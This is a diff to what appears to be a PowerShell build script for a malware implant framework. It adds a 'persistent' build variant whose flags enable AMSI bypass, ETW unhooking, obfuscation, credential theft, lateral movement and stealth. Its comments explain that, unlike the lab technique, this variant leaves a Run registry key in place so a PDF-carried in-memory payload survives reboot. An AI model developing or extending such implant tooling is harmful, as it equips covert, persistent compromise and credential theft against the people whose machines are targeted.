@@ -193,6 +193,25 @@ $arms = [ordered]@{
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
                     'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF',
                     'PX_STEALTH=1', 'PX_STEALTH_DELAY=20')
+    # The persistent arm: the stealth arm, and the session survives a
+    # reboot.
+    #
+    # The capability library's `persist` technique writes a Run key and
+    # then REMOVES it, because a lab technique that leaves litter is not
+    # a lab technique. That is right for a measurement and wrong for an
+    # instrument that has to come back after a reboot.
+    #
+    # This arm installs the key on the first connection and LEAVES it,
+    # and reports the command that removes it. The key points at the
+    # loader with the carrier PDF as its argument, because an in-memory
+    # payload has no image of its own -- the loader tells it where the
+    # document is.
+    'persistent' = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
+                    'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
+                    'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
+                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF',
+                    'PX_STEALTH=1', 'PX_STEALTH_DELAY=20',
+                    'PX_PERSISTENT=1')
     'full'      = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_DGA=1', 'PX_CRED_ACCESS=1',
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
